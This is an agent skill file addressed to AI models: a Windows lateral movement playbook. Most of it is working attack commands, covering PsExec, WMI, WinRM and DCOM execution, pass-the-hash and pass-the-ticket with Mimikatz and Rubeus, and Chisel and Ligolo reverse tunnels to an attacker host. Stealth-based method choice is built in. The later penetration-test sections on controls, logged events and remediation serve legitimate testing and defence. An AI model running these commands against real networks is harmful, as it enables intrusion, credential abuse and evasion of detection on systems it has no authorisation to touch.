---
name: windows-lateral-movement
description: >-
  Windows lateral movement playbook. Use when pivoting between Windows hosts via PsExec, WMI, WinRM, DCOM, RDP, pass-the-hash, overpass-the-hash, or pass-the-ticket techniques.
---

# SKILL: Windows Lateral Movement — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Windows lateral movement techniques. Covers PsExec, WMI, WinRM, DCOM, SMB, RDP, SSH, pass-the-hash, overpass-the-hash, pass-the-ticket, and pivoting. Base models miss execution method fingerprints, OPSEC trade-offs, and credential type requirements per method.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after landing on a new host for local escalation
- [windows-av-evasion](../windows-av-evasion/SKILL.md) when EDR blocks lateral movement tools
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos-based lateral (pass-the-ticket, delegation)
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based paths to new hosts

### Advanced Reference

Also load [CREDENTIAL_DUMPING.md](./CREDENTIAL_DUMPING.md) when you need:
- LSASS dump techniques (MiniDump, comsvcs.dll, nanodump)
- SAM/SYSTEM/SECURITY extraction
- DPAPI, credential manager, cached domain credentials
- NTDS.dit extraction methods

---

## 1. REMOTE EXECUTION METHODS COMPARISON

| Method | Port | Cred Type | Creates Service? | File on Disk? | OPSEC | Admin Required? |
|---|---|---|---|---|---|---|
| **PsExec** | 445 (SMB) | Password/Hash | Yes (PSEXESVC) | Yes (.exe) | Low | Yes |
| **Impacket smbexec** | 445 | Password/Hash | Yes (temp service) | No | Medium | Yes |
| **Impacket atexec** | 445 | Password/Hash | No (scheduled task) | No | Medium | Yes |
| **WMI** | 135+dynamic | Password/Hash | No | No | High | Yes |
| **WinRM** | 5985/5986 | Password/Hash/Ticket | No | No | High | Yes (Remote Mgmt) |
| **DCOM** | 135+dynamic | Password/Hash | No | No | High | Yes |
| **RDP** | 3389 | Password/Hash (RestrictedAdmin) | No | No | Low (GUI session) | RDP access |
| **SSH** | 22 | Password/Key | No | No | High | SSH enabled |
| **SC** | 445 | Password/Hash | Yes (custom service) | Yes | Low | Yes |

---

## 2. PSEXEC VARIANTS

### Impacket PsExec

```bash
# With password
psexec.py DOMAIN/administrator:password@TARGET_IP

# With NTLM hash (pass-the-hash)
psexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

### Impacket smbexec (Stealthier — No Binary Upload)

```bash
smbexec.py DOMAIN/administrator:password@TARGET_IP
smbexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP
```

### Impacket atexec (Scheduled Task)

```bash
atexec.py DOMAIN/administrator:password@TARGET_IP "whoami"
atexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP "whoami"
```

### Sysinternals PsExec

```cmd
PsExec64.exe \\TARGET -u DOMAIN\administrator -p password cmd.exe
PsExec64.exe \\TARGET -s cmd.exe    & REM Run as SYSTEM (-s)
PsExec64.exe \\TARGET -accepteula -s -d cmd.exe /c "C:\temp\payload.exe"
```

---

## 3. WMI LATERAL MOVEMENT

```bash
# Impacket wmiexec
wmiexec.py DOMAIN/administrator:password@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# With Kerberos
export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass DOMAIN/administrator@target.domain.com
```

```powershell
# PowerShell WMI process creation
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName TARGET -Credential $cred

# WMI event subscription persistence
$filterArgs = @{
    EventNamespace = 'root\cimv2'; Name = 'Updater';
    QueryLanguage = 'WQL';
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```

---

## 4. WINRM LATERAL MOVEMENT

```bash
# evil-winrm (from Linux — with password)
evil-winrm -i TARGET_IP -u administrator -p password

# evil-winrm (with hash)
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# evil-winrm (with Kerberos)
evil-winrm -i target.domain.com -r DOMAIN.COM
```

```powershell
# PowerShell remoting
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# Execute command remotely
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# Multiple targets simultaneously
Invoke-Command -ComputerName TARGET1,TARGET2 -Credential $cred -ScriptBlock { hostname; whoami }
```

---

## 5. DCOM LATERAL MOVEMENT

Stealthy — uses legitimate COM objects, no service creation.

### MMC20.Application

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")
```

### ShellWindows

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","C:\Windows\System32",$null,0)
```

### ShellBrowserWindow

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### Impacket dcomexec

```bash
dcomexec.py DOMAIN/administrator:password@TARGET_IP
dcomexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP -object MMC20
```

---

## 6. PASS-THE-HASH (PTH)

Use NTLM hash directly without knowing the plaintext password.

```bash
# CrackMapExec — spray/check admin access
crackmapexec smb TARGETS -u administrator -H NTLM_HASH

# Impacket tools (all support -hashes)
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET

# evil-winrm
evil-winrm -i TARGET -u user -H NTLM_HASH

# xfreerdp (Restricted Admin mode must be enabled)
xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /d:DOMAIN
```

```cmd
# Mimikatz PTH (spawns new process with injected creds)
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Enable Restricted Admin for RDP PTH

```cmd
# On target (requires admin): enable restricted admin
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

---

## 7. OVERPASS-THE-HASH (PASS-THE-KEY)

Convert NTLM hash → Kerberos TGT → pure Kerberos authentication.

```bash
# Request TGT with hash
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Or with AES256 key
getTGT.py DOMAIN/user -aesKey AES256_KEY -dc-ip DC_IP

# Use Kerberos for all subsequent tools
psexec.py -k -no-pass DOMAIN/user@target.domain.com
wmiexec.py -k -no-pass DOMAIN/user@target.domain.com
```

```cmd
# Mimikatz overpass-the-hash
sekurlsa::pth /user:user /domain:DOMAIN /ntlm:HASH /run:powershell.exe
# New PowerShell session → klist shows Kerberos TGT
```

**Advantage**: Pure Kerberos auth avoids NTLM logging and detection.

---

## 8. PASS-THE-TICKET

```bash
# Use existing .ccache ticket
export KRB5CCNAME=/path/to/admin.ccache
psexec.py -k -no-pass DOMAIN/admin@target.domain.com
```

```cmd
# Mimikatz — inject .kirbi ticket
kerberos::ptt ticket.kirbi
# Verify
klist

# Rubeus
Rubeus.exe ptt /ticket:base64_blob
```

---

## 9. PIVOTING THROUGH COMPROMISED HOSTS

### SSH Tunnel / Port Forward

```bash
# Dynamic SOCKS proxy through compromised host
ssh -D 1080 user@COMPROMISED_HOST
# Use with proxychains

# Local port forward (access internal service)
ssh -L 8888:INTERNAL_TARGET:445 user@COMPROMISED_HOST
```

### Chisel (No SSH Needed)

```bash
# On attacker (server)
chisel server --reverse -p 8080

# On compromised host (client)
chisel client ATTACKER:8080 R:socks
# Creates SOCKS5 proxy on attacker's port 1080
```

### Ligolo-ng (Modern, Fast)

```bash
# On attacker
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On compromised host
ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# In ligolo console
session          # Select agent
start            # Start tunnel
# Add route: sudo ip route add INTERNAL_SUBNET/24 dev ligolo
```

---

## 10. LATERAL MOVEMENT DECISION TREE

```
Have credentials / hash — need to move laterally
│
├── What credentials do you have?
│   ├── Plaintext password → any method
│   ├── NTLM hash → PTH methods (§6)
│   │   ├── Need stealthier? → Overpass-the-Hash first (§7)
│   │   └── Direct use → psexec/wmiexec/evil-winrm with -H
│   ├── Kerberos ticket → Pass-the-Ticket (§8)
│   └── AES key → Overpass-the-Hash with -aesKey (§7)
│
├── OPSEC priority?
│   ├── High stealth needed
│   │   ├── WMI (no file on disk, no service) → wmiexec (§3)
│   │   ├── DCOM (uses legitimate COM) → dcomexec (§5)
│   │   └── WinRM (PowerShell remoting) → evil-winrm (§4)
│   ├── Moderate stealth
│   │   ├── smbexec (no binary upload) (§2)
│   │   └── atexec (scheduled task, auto-cleanup) (§2)
│   └── Low stealth acceptable
│       ├── PsExec (reliable, creates service) (§2)
│       └── RDP (interactive GUI) (§6)
│
├── Need to pivot to internal network?
│   ├── SSH available → SSH tunnel / SOCKS (§9)
│   ├── No SSH → Chisel or Ligolo-ng (§9)
│   └── Multiple hops → chain SOCKS proxies
│
├── Target hardening?
│   ├── SMB signing required → WMI, WinRM, or DCOM
│   ├── WinRM disabled → WMI or DCOM
│   ├── Firewall blocks 135/445 → RDP or SSH
│   └── Restricted Admin disabled → no RDP PTH → use other methods
│
└── Need to dump creds on new host?
    └── Load CREDENTIAL_DUMPING.md
```

---

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **credential or ticket** are you moving with, and where did it come from? | provenance and scope |
| 2 | Did the **control attempt fail** - the same access with no credential, or an unprivileged one? | the credential is what worked |
| 3 | Did you **obtain a shell or a command result on the second host**, not just an auth success? | movement, not authentication |
| 4 | What **identity, groups, and privileges** do you hold on the new host? | whether the movement escalated |
| 5 | Did the technique leave a **logged event** the client can find? | the blue-team half |
| 6 | Does the technique work on the **target's build and patch level**? | applicability |
| 7 | Did you **clean up** any artefact (a service, a session, a file) and verify it? | engagement integrity |

**A command result on the second host is the bar.** A successful authentication with no executed command
is an exposure; the command output is the movement.

---

## 12. EXECUTION PRIMITIVES

Lateral movement is proven by **a command executed on a second host, paired with the same attempt
failing without the credential**. Every block ends at output from the target host.

### 11.1 Establish the credential and the control

```bash
# what you hold, and where it is valid
.\Rubeus.exe triage 2>&1 | Select-Object -First 20
klist 2>&1 | Select-Object -First 20
.\SharpHound.exe -c Session,LoggedOn --domain CORP.LOCAL 2>&1 | Select-Object -First 5
# THE CONTROL: the same access attempt with NO credential - it must fail
.\PsExec64.exe -accepteula \\HOST02 cmd /c whoami 2>&1 | Select-Object -Last 2
.\SharpWMI.exe action=exec computername=HOST02 command="cmd /c whoami" 2>&1 | Select-Object -First 3
```

**Run the unauthenticated control first.** An authentication that succeeds without your credential is
not lateral movement, and this control is what separates the two.

### 11.2 The credential's reach, enumerated

```powershell
# which hosts accept the credential - the reach is the severity
Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object -First 30 Name,OperatingSystem
# the check against a candidate set, with a marker per host
foreach ($h in @("HOST02","HOST03","HOST04")) {
  $r = & cmd /c ".\PsExec64.exe -accepteula \\$h cmd /c hostname 2>NUL"
  Write-Host ("{0,-10} {1}" -f $h, ($r -join ' '))
}
# and the sessions on the hosts you can already reach, which is where new credentials live
.\SharpHound.exe -c LoggedOn --domain CORP.LOCAL 2>&1 | Select-Object -First 5
qwinsta /server:HOST02 2>&1 | Select-Object -First 10
```

**Enumerate the reach and report it as a count.** "This local admin hash authenticates to 12 of the 40
hosts tested" is the finding shape, and the count is the severity.

### 11.3 Remote execution methods, each with its artefact

```powershell
# 1) WMI - the quietest and the most logged at the same time
.\SharpWMI.exe action=exec computername=HOST02 command="cmd /c whoami > C:\Windows\Temp\lm.txt" 2>&1 | Select-Object -First 3
.\SharpWMI.exe action=exec computername=HOST02 command="cmd /c type C:\Windows\Temp\lm.txt" 2>&1 | Select-Object -First 5
# 2) WinRM - the modern default
Invoke-Command -ComputerName HOST02 -ScriptBlock { whoami; hostname } 2>&1 | Select-Object -First 5
# 3) DCOM - the method that survives when the others are blocked
.\SharpDCOM.exe 2>&1 | Select-Object -First 10
# 4) SMB service creation, which is what PsExec does
.\PsExec64.exe -accepteula \\HOST02 cmd /c "whoami & hostname" 2>&1 | Select-Object -Last 4
# 5) and the scheduled-task path, which is the quietest of the five
schtasks /s HOST02 /create /tn LM /tr "cmd /c whoami > C:\Windows\Temp\lm2.txt" /sc once /st 00:00 /ru SYSTEM /f 2>&1 | Select-Object -First 2
schtasks /s HOST02 /run /tn LM 2>&1 | Select-Object -First 1
schtasks /s HOST02 /delete /tn LM /f 2>&1 | Select-Object -First 1
```

**Each method gets a command result and a cleanup.** The five methods differ in detectability, not in
capability, and the report should name which one was used and what it created.

### 11.4 Pass-the-hash, pass-the-ticket, and the control

```bash
# pass-the-hash with the harvested NT hash
.\mimikatz.exe "sekurlsa::pth /user:administrator /domain:CORP /ntlm:HASH /run:cmd.exe" 2>&1 | Select-Object -First 5
# the proof: the new session's identity, and a command on a remote host
.\PsExec64.exe -accepteula \\HOST02 cmd /c whoami 2>&1 | Select-Object -Last 2
# pass-the-ticket, which needs no password and survives a hash rotation
.\Rubeus.exe ptt /ticket:BASE64_OR_FILE 2>&1 | Select-Object -First 4
klist
.\PsExec64.exe -accepteula \\HOST03 cmd /c whoami 2>&1 | Select-Object -Last 2
# THE CONTROL: the same commands with no injected material
.\PsExec64.exe -accepteula \\HOST02 cmd /c whoami 2>&1 | Select-Object -Last 2
```

**The control after injection is what proves the injection worked.** A same-user session will also run
`whoami`; what distinguishes the injection is the identity it reports and the hosts it reaches.

### 11.5 Linux-side lateral movement, with the same pairing

```bash
# the harvested key, used against a second host
ssh -i ~/.ssh/id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no user@HOST02 'id; hostname' 2>&1 | head -3
# THE CONTROL: the same connection with no key, which must fail
ssh -o BatchMode=yes -o ConnectTimeout=4 user@HOST02 'id' 2>&1 | head -2
# the reach check across the internal ranges
for h in $(seq 1 20); do
  timeout 2 bash -c "echo > /dev/tcp/10.0.0.$h/22" 2>/dev/null && echo "ssh open: 10.0.0.$h"
done | head -10
# and the agent-forwarding case, which yields movement with no key on disk
ssh-add -l 2>/dev/null | head -5
```

**The control connection with no key is mandatory.** The count of hosts that accept the key is the
finding, and the failing control is what makes it a movement rather than the network's normal state.

### 11.6 Pivoting and the tunnel's proof

```bash
# an application-level tunnel through the first host
ssh -N -L 8080:INTERNAL_HOST:80 user@HOST02 2>&1 | head -2 &
curl -sS -o /dev/null -w 'tunnel %{http_code}\n' http://127.0.0.1:8080/ 2>&1 | tail -1
# THE CONTROL: the same request directly, which must fail from your position
curl -sS -o /dev/null -w 'direct %{http_code}\n' --max-time 4 http://INTERNAL_HOST/ 2>&1 | tail -1
# a SOCKS pivot, which carries a whole toolchain
ssh -N -D 1080 user@HOST02 2>&1 | head -2 &
curl -sS --socks5 127.0.0.1:1080 -o /dev/null -w 'socks %{http_code}\n' http://INTERNAL_HOST/ 2>&1 | tail -1
# and the chisel or similar, for when SSH is unavailable
./chisel client HOST02:8080 socks 2>&1 | head -3 &
```

**The control pair is the tunnel's proof.** A tunnel that returns 200 while the direct request fails is
the finding; a tunnel with no direct control proves nothing about network segmentation.

### 11.7 The event log the movement generated

```powershell
# the events each method produces, named for the client's hunt
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624,4648,4672} -MaxEvents 20 2>$null |
  Select-Object TimeCreated,Id,@{n='M';e={$_.Message.Substring(0,80)}}
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WinRM/Operational'} -MaxEvents 10 2>$null | Select-Object -First 10
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3} -MaxEvents 10 2>$null | Select-Object -First 10
Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} -MaxEvents 10 2>$null | Select-Object -First 10
```

**Name the event IDs per method.** 4648 logon-with-explicit-credentials for the PTH case, 7045 for the
service path, and the WinRM operational log for the PSRemoting path are the three that matter most.

### 11.8 The end-to-end harness

```powershell
$ErrorActionPreference='SilentlyContinue'
$Targets = @("HOST02","HOST03")
Write-Host "CREDENTIAL: <name it>  SOURCE: <where you obtained it>"
Write-Host "TICKET/HASH VALID UNTIL: <expiry>"
Write-Host ""
Write-Host "CONTROL - the same access with no credential:"
foreach ($h in $Targets) {
  $ctl = & cmd /c ".\PsExec64.exe -accepteula \\$h cmd /c whoami 2>NUL"
  Write-Host ("  {0,-10} {1}" -f $h, (($ctl -join ' ') -replace '\s+',' '))
}
Write-Host ""
Write-Host "MOVEMENT - with the credential:"
foreach ($h in $Targets) {
  $r = & cmd /c ".\PsExec64.exe -accepteula \\$h cmd /c hostname 2>NUL"
  Write-Host ("  {0,-10} {1}" -f $h, (($r -join ' ') -replace '\s+',' '))
}
Write-Host ""
Write-Host "CLEANUP: delete every service, task, and temp file you created on each host"
Write-Host "         and re-run the hostname command to confirm it still works (that is the flag-free check)"
```

**Control, movement, cleanup.** Three parts; a lateral-movement report missing the unauthenticated
control has not shown that the credential was what worked.

---

## 13. EVIDENCE STANDARD — MOVEMENT

| Item | Why |
|---|---|
| The **credential's provenance and type** (a password, a hash, a ticket, a key) | scope and remediation |
| The **unauthenticated control** per host | proves the credential is what worked |
| The **command output from the second host** | movement, not authentication |
| The **identity and privileges on the new host** | whether the movement escalated |
| The **reach count** across the hosts tested | the severity driver |
| The **method used** (WMI, WinRM, DCOM, SMB, task, SSH) and its detectability | the blue-team half |
| The **event IDs** each method generates | the hunt |
| The **cleanup of every artefact**, verified | engagement integrity |
| The **technique is blocked at the current patch level** for anything version-bound | applicability |
| Confirmation that no **credential material** beyond what the client needs is retained | data minimisation |

Report the **movement and the reach**: "the NT hash for `CORP\svc-backup` was recovered from LSASS on
`WS01`; with it injected (`sekurlsa::pth`), `PsExec64.exe \\HOST02 cmd /c whoami` returned
`corp\svc-backup` where the same command without the injected material returned `Access is denied`, which
is the control. The identity is a local administrator on 12 of the 40 hosts tested, and on `HOST07` it is
also a member of the `Backup Operators` group. Every service PsExec created was deleted and the command
re-run to confirm; the LSASS dump file was deleted", never "an administrator hash was cracked".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| An authentication success with **no command executed** | an exposure, not movement |
| A successful connection **without the control pair** | the network may permit it for everyone |
| A credential that works **only on the host you harvested it from** | no movement |
| A technique that **failed at the current patch level** | verify applicability before reporting |
| A pivot with **no direct-request control** | segmentation is unproven |
| Movement to a host that is **in your engagement scope but not the client's** | scope error |
| An admin share listed as access with **no file operation** | ACL state, not movement |
| A tool that ran **locally** reported as remote execution | verify the hostname in the output |
| A credential **you were issued for the engagement** | the baseline, not a finding |
| An event log entry **you cannot tie to a specific action** | name the action first |
| A hash or ticket reproduced in full | a disclosure |

**Control, command output, reach count.** Lateral-movement reports fail when they show authentication
and omit the control, which cannot distinguish movement from an open network.

---

## 14. REMEDIATION REFERENCE

1. **Use tiered administrative accounts, and never reuse a local administrator password across hosts** - the reach of a single credential is the severity of every finding in this document.
2. **Enable Local Administrator Password Solution (LAPS) or an equivalent, and rotate on a schedule** - it converts a 12-host reach into a one-host finding.
3. **Restrict remote execution paths (WMI, WinRM, DCOM, admin shares) to a small set of management hosts by firewall policy** - the methods differ only in detectability; the control is the network rule.
4. **Enable Credential Guard and LSA protection to stop the hash and ticket extraction that begins the chain** - most lateral movement starts with a credential that should not have been readable.
5. **Remove users from `Backup Operators`, `Server Operators`, and similar groups that carry implicit remote access** - these memberships are routinely overlooked and each is a movement path.
6. **Disable NTLM where possible, and enforce SMB signing and LDAP signing to block relay** - the relay path is a lateral movement primitive in its own right.
7. **Restrict password-based SSH and require short-lived certificates** - the key-file path in 11.5 is the Linux equivalent of the local-admin reuse problem.
8. **Segment the network so that administrative protocols cannot traverse between workstation and server tiers** - the pivot in 11.6 is blocked by the segment rule, not by a host control.
9. **Alert on `4648` across hosts, on `7045` remote service creation, and on WinRM sessions from unexpected sources** - each maps to one of the methods here and each is a reliable detection.
10. **Monitor for authentication anomalies: one identity authenticating to many hosts in a short window** - the reach enumeration in 11.2 is exactly this pattern and it is easy to alert on.
11. **Rotate every credential exposed during the engagement and confirm the rotation with the client** - an engagement that moves with a credential leaves the client with an obligation, and the report must state it explicitly.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER

- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) - the Windows-side methods in full
- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) - the Linux-side counterpart
- [windows-postexploit](../windows-postexploit/SKILL.md) - where the credential used here is harvested
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) - the ticket-based paths in depth
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - the technique mapping for detection engineering
